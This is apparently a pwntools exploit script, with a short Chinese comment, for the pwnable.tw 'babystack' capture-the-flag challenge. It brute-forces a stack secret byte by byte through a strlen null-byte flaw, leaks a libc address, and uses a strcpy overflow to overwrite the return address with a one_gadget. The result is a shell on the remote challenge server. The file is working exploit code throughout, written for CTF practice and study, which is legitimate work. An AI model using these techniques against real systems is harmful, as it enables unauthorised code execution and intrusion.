#通过strlen遇'\x00'截止，一位爆破rand，又因为fun1和fun3的buf是重叠的，再利用strcpy进行溢出
from pwn import *

context.log_level = 'debug'
prog = './babystack'
elf = ELF(prog)
p = process(prog)

libc = ELF("./libc_64.so.6")#/lib/x86_64-linux-gnu/libc-2.23.so")
p = remote('chall.pwnable.tw', 10205)
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def login(i):
	p.sendafter(">> ", '1'*8)
	p.sendafter("passowrd :", i+'\x00')
	return p.recvline()
def copy():
	p.sendlineafter(">> ", '3')
	p.sendafter('Copy :', "a"*63)
def exp():
	guess = ''
	for _ in range(0x10):
		for i in range(1, 0x100):
			if 'Success' in login(guess+chr(i)):
				guess += chr(i)
				p.sendline("1")
				break
	log.info('password is ' + guess)
	p.sendlineafter(">> ", '1')
	payload = guess+'\x00'
	payload = payload.ljust(64, 'a')+guess+'1'*8
	p.sendafter("passowrd :", payload)
	copy()
	p.sendafter(">> ", '1'*8)
	guess += '1'*0x8
	
	for _ in range(6):
		for i in range(1, 0x100):
			if 'Success' in login(guess+chr(i)):
				guess += chr(i)
				if _ != 5:
					p.sendafter(">> ", '1'*8)
				break
	log.info('password is ' + guess)
	libc.address = u64(guess[-6:]+'\x00'*2)-libc.sym['setvbuf']-324
	log.info('libc.address is ' + hex(libc.address))
	one = libc.address + 0x45216
	payload = guess[:16]+'\x00'
	payload = payload.ljust(64, 'a')+guess[:16]+'1'*0x18+p64(one)
	p.sendlineafter(">> ", '1')
	p.sendlineafter(">> ", '1')
	p.sendafter("passowrd :", payload)
	copy()
	p.sendlineafter(">> ", '2')

	p.interactive()
if __name__ == '__main__':
	exp()
